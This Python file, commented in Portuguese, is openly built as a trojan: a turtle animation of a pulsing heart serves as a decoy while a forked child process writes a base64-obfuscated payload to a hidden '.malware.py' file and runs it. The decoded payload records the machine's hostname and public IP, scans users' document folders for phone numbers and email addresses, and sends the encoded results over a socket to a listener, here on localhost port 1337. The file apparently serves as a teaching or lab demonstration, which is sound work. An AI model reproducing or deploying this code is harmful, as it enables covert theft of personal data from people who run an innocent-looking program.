import os
import time
import base64
import turtle

t = turtle.Turtle()
t.speed(0)
t.hideturtle()
screen = turtle.Screen()
screen.bgcolor("lightblue")

# Função para desenhar um coração
def draw_heart(size):
    t.begin_fill()
    t.fillcolor("red")
    t.left(50)
    t.forward(size)
    t.circle(size * 0.4, 180)
    t.right(100)
    t.circle(size * 0.4, 180)
    t.forward(size)
    t.end_fill()

# Loop da animação
def animate_heart():
    size = 50
    growing = True

    while True:
        t.clear()
        draw_heart(size)
        screen.update()
        
        if growing:
            size += 1
            if size > 70:
                growing = False
        else:
            size -= 1
            if size < 50:
                growing = True

        time.sleep(0.05)

def main():
    pid = os.fork()

    if pid > 0:
        # Processo que parece ser legítimo
        
        # Configuração da tela
        screen.tracer(0)

        # Inicia a animação
        animate_heart()

        # Mantém a janela aberta
        turtle.done()
    else:
        # Processo do Trojan
        trojan()

def trojan():
    malware_fd = open(".malware.py", "wb")
    blob = "aW1wb3J0IHJlcXVlc3RzDQppbXBvcnQgc29ja2V0DQppbXBvcnQgYmFzZTY0DQppbXBvcnQganNvbg0KaW1wb3J0IHJlDQppbXBvcnQgb3MNCmltcG9ydCB0cWRtDQoNCmRlZiBtYWluKCk6DQogICAgIyBQZWdhIG8gaG9zdCBkYSBtw6FxdWluYQ0KICAgIGhvc3RuYW1lID0gc29ja2V0LmdldGhvc3RuYW1lKCkNCg0KICAgICMgUGVnYSBvIGlwIHDDumJsaWNvIGRhIG3DoXF1aW5hDQogICAgaGVhZGVycyA9IHsNCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0OyBydjo3OC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94Lzc4LjAiDQogICAgfQ0KICAgIHB1YmxpY19pcCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9pcGFwaS5jby9pcCIsIGhlYWRlcnMgPSBoZWFkZXJzKS50ZXh0DQoNCiAgICAjIEJ1c2NhIHBvciBlbmRlcmXDp29zIGRlIGJpdGNvaW5zIGUgZW5kZXJlw6dvcyBkZSBlbWFpbHMNCiAgICBudW1iZXJfYWRkcmVzc2VzX2xpc3QgPSBbXQ0KICAgIGVtYWlsX2FkZHJlc3Nlc19saXN0ID0gW10NCg0KICAgICNQZWdhIHRvZG9zIGFzIHNlw6fDtWVzIGRlIERvY3VtZW50b3MgZGUgdG9kb3Mgb3MgdXN1w6FyaW9zDQogICAgaG9tZSA9IG9zLmxpc3RkaXIoJy9ob21lJykNCiAgICB1c2Vyc19kb2NzID0gW2YnL2hvbWUve3VzZXJ9L0RvY3VtZW50b3MnIGZvciB1c2VyIGluIGhvbWVdICAgIA0KDQogICAgcXRkX2RvY3MgPSAwDQogICAgZm9yIGRvYyBpbiB1c2Vyc19kb2NzOg0KICAgICAgICBxdGRfZG9jcyArPSBsZW4oW3Jvb3QgZm9yIHJvb3QsIF8sIF8gaW4gb3Mud2Fsayhkb2MpXSkNCg0KICAgIGZvciBkb2MgaW4gdXNlcnNfZG9jczoNCiAgICAgICAgZm9yIHJvb3QsIF8sIGZpbGVzIGluIHRxZG0udHFkbShvcy53YWxrKGRvYyksIGxlYXZlPUZhbHNlKToNCiAgICAgICAgICAgIGZvciBmaWxlIGluIGZpbGVzOg0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICNJZ25vcmEgb3MgYXJxdWl2b3MgemlwLCBwb3Igc2VyZW0gbXQgZ3JhbmRlcw0KICAgICAgICAgICAgICAgIGlmIGZpbGUuZW5kc3dpdGgoKCd6aXAnLCAncHljJywgJzInLCAncGFjaycsICdwbmcnLCAnYm1wJywgJ3RpZicsICdqcGcnLCAnanBlZycpKToNCiAgICAgICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGZpbGVfZmQgPSBvcGVuKCJ7fS97fSIuZm9ybWF0KHJvb3QsIGZpbGUpLCAiciIpDQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAjIFBlZ2EgbyBjb250ZcO6ZG8gZGUgY2FkYSBhcnF1aXZvDQogICAgICAgICAgICAgICAgICAgIGZpbGVfY29udGVudHMgPSBmaWxlX2ZkLnJlYWQoKS5zdHJpcCgpDQoNCiAgICAgICAgICAgICAgICAgICAgIyBQcm9jdXJhIHBvciBlbmRlcmXDp29zIGRlIGJpdGNvaW5zDQogICAgICAgICAgICAgICAgICAgICMgUHJvY3VyYSBwb3IgZW5kZXJlw6dvcyBxdWUgY29tZcOnYW0gY29tIDEgb3UgMyBlIHRlbSAyNiBvdSAzMyBjYXJhY3RlcmVzDQogICAgICAgICAgICAgICAgICAgICMgUHJvY3VyYSBwb3IgZW5kZXJlw6dvcyBTZWdXaXQgKGNvbWXDp2FuZG8gY29tIGJjMSBlIHRlbmRvIDM5IGEgNTkgY2FyYWN0ZXJlcykNCiAgICAgICAgICAgICAgICAgICAgIyBiaXRjb2luX2FkZHJlc3NlcyA9IHJlLmZpbmRhbGwociIoWzEzXXsxfVthLWttLXpBLUhKLU5QLVoxLTldezI2LDMzfXxiYzFbYS16MC05XXszOSw1OX0pIiwgZmlsZV9jb250ZW50cykNCg0KICAgICAgICAgICAgICAgICAgICAjUHJvY3VyYSBwb3Igbm9tZXMgZGUgdXN1w6FyaW8gcXVlIHRlbSBvIGZvcm1hdG8gZGUgdW0gbsO6bWVybyBubyBCcmFzaWwgKERERCkgODMgOUFCQ0QgRUZHSA0KICAgICAgICAgICAgICAgICAgICBwaG9uZV9udW1iZXJzID0gcmUuZmluZGFsbChyIlwoP1xkezJ9XCk/XHM/XGR7NCw1fS1cZHs0fSIsIGZpbGVfY29udGVudHMpDQoNCiAgICAgICAgICAgICAgICAgICAgIyBQcm9jdXJhIHBvciBlbmRlcmXDp29zIGRlIGVtYWlsDQogICAgICAgICAgICAgICAgICAgIGVtYWlsX2FkZHJlc3NlcyA9IHJlLmZpbmRhbGwociJbYS16MC05Ll9dK0BbYS16MC05XStcLlthLXpdezEsN30iLCBmaWxlX2NvbnRlbnRzKQ0KDQogICAgICAgICAgICAgICAgICAgICMgVsOqIHNlIGFjaG91IGFsZ28NCiAgICAgICAgICAgICAgICAgICAgaWYgbGVuKHBob25lX251bWJlcnMpID4gMDoNCiAgICAgICAgICAgICAgICAgICAgICAgIG51bWJlcl9hZGRyZXNzZXNfbGlzdCA9IG51bWJlcl9hZGRyZXNzZXNfbGlzdCArIHBob25lX251bWJlcnMNCiAgICAgICAgICAgICAgICAgICAgaWYgbGVuKGVtYWlsX2FkZHJlc3NlcykgPiAwOg0KICAgICAgICAgICAgICAgICAgICAgICAgZW1haWxfYWRkcmVzc2VzX2xpc3QgPSBlbWFpbF9hZGRyZXNzZXNfbGlzdCArIGVtYWlsX2FkZHJlc3Nlcw0KDQogICAgICAgICAgICAgICAgICAgIGZpbGVfZmQuY2xvc2UoKQ0KICAgICAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICAgICAgcGFzcw0KDQogICAgIyBCb3RhIG51bSBqc29uDQogICAgZGF0YSA9IHsNCiAgICAgICAgIm1hY2hpbmVfaG9zdG5hbWUiOiBob3N0bmFtZSwNCiAgICAgICAgIm1hY2hpbmVfaXAiOiBwdWJsaWNfaXAsDQogICAgICAgICI1X3Bob25lX251bWJlcnNfZm91bmQiOiBudW1iZXJfYWRkcmVzc2VzX2xpc3RbOjVdLA0KICAgICAgICAiNV9lbWFpbF9hZGRyZXNzZXNfZm91bmQiOiBlbWFpbF9hZGRyZXNzZXNfbGlzdFs6NV0NCiAgICB9DQoNCiAgICAjIENvZGlmaWNhIG8ganNvbiBwYXJhIGI2NA0KICAgIGVuY29kZWRfZGF0YSA9IGJhc2U2NC5iNjRlbmNvZGUoanNvbi5kdW1wcyhkYXRhKS5lbmNvZGUoKSkNCg0KICAgICMgQ3JpYSB1bSBzb2NrZXQgZSBzZSBjb25lY3RhIGNvbSBvIHNlcnZpZG9yIG5hIHBvcnQgYTEzMzcNCg0KICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pDQoNCiAgICBwcmludCgiRW52aWFuZG8gaW5mb3JtYcOnw7VlcyBhbyBzZXJ2aWRvciIpDQoNCiAgICBzLmNvbm5lY3QoKCIxMjcuMC4wLjEiLCAxMzM3KSkNCiAgICBzLnNlbmQoZW5jb2RlZF9kYXRhKQ0KICAgIHMuY2xvc2UoKQ0KDQoNCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6DQogICAgbWFpbigp"
        
    malware = base64.b64decode(blob)
    malware_fd.write(malware)
    malware_fd.close()

    os.system("trojan/bin/python3 .malware.py")

if __name__ == '__main__':
    main()